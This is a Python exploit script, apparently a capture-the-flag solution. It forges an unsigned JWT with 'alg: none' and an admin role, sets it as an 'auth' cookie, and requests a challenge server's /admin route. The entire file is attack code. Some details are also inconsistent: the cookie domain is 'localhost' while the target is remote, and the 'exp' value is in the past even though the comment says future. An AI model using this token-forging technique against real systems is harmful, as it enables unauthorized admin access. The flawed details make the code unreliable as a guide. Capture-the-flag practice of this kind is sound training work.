import base64
import json
import requests

# Replace with the URL of the Flask application
BASE_URL = 'http://chal.competitivecyber.club:1337/'

def create_unsigned_jwt(payload):
    # Header with alg set to none
    header = {
        "alg": "none",
        "typ": "JWT"
    }

    # Encode header and payload without signature
    def b64_encode(data):
        return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=')

    encoded_header = b64_encode(header)
    encoded_payload = b64_encode(payload)

    # Construct token without signature part
    token = encoded_header + b'.' + encoded_payload + b'.'

    return token.decode()

def exploit():
    # Payload with elevated role
    payload = {
        "email": "admin@competitivecyber.club",
        "role": "admin",
        # Add a future expiration time if necessary
        "exp": 1000
    }

    # Create the unsigned JWT token
    token = create_unsigned_jwt(payload)
    print(f"[+] Crafted JWT Token: {token}")

    # Start a session to maintain cookies
    session = requests.Session()

    # Set the token in the session cookie
    session.cookies.set('auth', token, domain='localhost')

    # Attempt to access an admin-only route
    admin_url = f"{BASE_URL}/admin"

    response = session.get(admin_url)

    if response.status_code == 200:
        print("[+] Successfully accessed admin route!")
        print("Admin Page Content:")
        print(response.text)
    else:
        print("[-] Failed to access admin route.")
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text}")

if __name__ == "__main__":
    exploit()
